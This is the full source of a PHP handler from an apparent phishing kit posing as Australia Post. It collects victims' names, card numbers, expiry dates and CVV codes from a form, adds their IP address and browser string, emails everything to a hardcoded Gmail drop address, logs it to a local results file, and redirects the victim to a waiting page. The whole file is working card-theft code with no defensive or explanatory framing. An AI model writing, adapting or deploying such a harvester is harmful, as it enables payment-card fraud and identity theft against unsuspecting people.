<?php
$zabi = getenv("REMOTE_ADDR");
$message .= "--++-----[ Card australia POST ]-----++--\n";
$message .= "-------------- BY Yass ht-----\n";
$message .= "first name : ".$_POST['fname']."\n";
$message .= "last name : ".$_POST['lname']."\n";
$message .= "card number : ".$_POST['card']."\n";
$message .= "Exp date : ".$_POST['exp']."\n";
$message .= "Cvv : ".$_POST['cvv']."\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "----------------------By Yass ht ----------------------\n";
$subject = "Card australia POST [ " . $zabi . " ] ";
$email = "resultcash2020@gmail.com";
mail($email,$subject,$message);
    $text = fopen('../rzlt.txt', 'a');
fwrite($text, $message);

header("Location: ../wait/");?>
